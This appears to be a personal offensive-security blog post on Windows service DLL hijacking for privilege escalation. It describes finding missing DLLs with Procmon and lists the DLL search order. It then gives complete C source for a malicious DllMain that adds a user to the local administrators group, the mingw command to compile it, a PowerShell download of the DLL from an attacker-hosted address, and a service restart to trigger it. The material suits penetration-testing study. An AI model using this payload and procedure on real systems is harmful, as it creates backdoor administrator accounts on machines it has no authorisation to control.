---
layout: post
title: Windows Service DLL Hijacking
titledate: 09/15/23
tags: ["infosec","offsec", "privesc", "powershell", "exploit", "dll"]
---

#### dll hijacking

if we are unable to replace the binary bc of a permission issue we may be able to work with its dlls

we can run procmon to display the loaded dlls of the binary we are interested in, however, we need admin creds to run procmon

depending on the application, if necessary we can copy the binary to our local system to execute in a different administrator environment to see which dlls we have available to us

in Procmon -> Filter -> Filter -> Proces Name is -> proc 'include'

to get our process to register in procmon

    PS > Restart-Service proc

looking at the procmon results we see a lot of name not found for a specific dll

with the missing dll we can attempt to write a dll to the dll search order path

    1. The directory from which the application loaded.
    2. The system directory.
    3. The 16-bit system directory.
    4. The Windows directory. 
    5. The current directory.
    6. The directories that are listed in the PATH environment variable.

dll main can be optional and executed when processes or threads attach to and execute the dll - 

if a dll does not contain a dll main function then that dll only provides resources

    PS > $env:path

checking the environment path 

```c
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
above is a MS example of a DLL that demonstrates the four cases in which a dll is used

since our example is trying to load a dll we will use that case

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    //i = system ("net user daveadmin password123!"); //to change a current users password.
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

now we cross compile our cpp code to the name of the dll we want to use

    $ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

copy the binary over to the correct directory

    PS C:\Users\me\dlldirectory > iwr -uri http://192.168.1.1/myDLL.dll -Outfile myDLL.dll

restart the service 

    PS > Restart-Service BetaService